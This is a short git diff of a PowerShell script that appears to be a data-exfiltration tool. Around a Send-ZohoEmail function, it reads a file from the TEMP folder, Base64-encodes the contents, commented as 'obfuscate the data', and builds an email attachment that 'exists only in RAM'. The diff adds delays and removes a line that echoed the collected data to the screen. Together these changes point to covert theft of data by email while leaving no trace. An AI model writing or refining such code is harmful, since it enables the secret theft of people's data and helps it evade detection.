@@ -139,9 +139,9 @@ function Send-ZohoEmail {
 #     Start-Sleep -Seconds 2
 #     Remove-Item $outputFilePath -Force
 # }
+Start-Sleep -Seconds 2
 
-$rawData = Get-Content $outputFilePath | Out-String
-Write-Host $rawData
+$rawData = Get-Content "$env:TEMP\data.txt" | Out-String
 
 # 4. Obfuscate the data using Base64
 $bytes = [System.Text.Encoding]::UTF8.GetBytes($rawData)
@@ -153,6 +153,8 @@ $writer = New-Object System.IO.StreamWriter($ms)
 $writer.Write($b64String)
 $writer.Flush()
 $ms.Position = 0
+
+Start-Sleep -Seconds 2
 
 # 6. Create the Email Attachment (exists only in RAM)
 $attachment = New-Object Net.Mail.Attachment($ms, "$env:TEMP\data.txt")
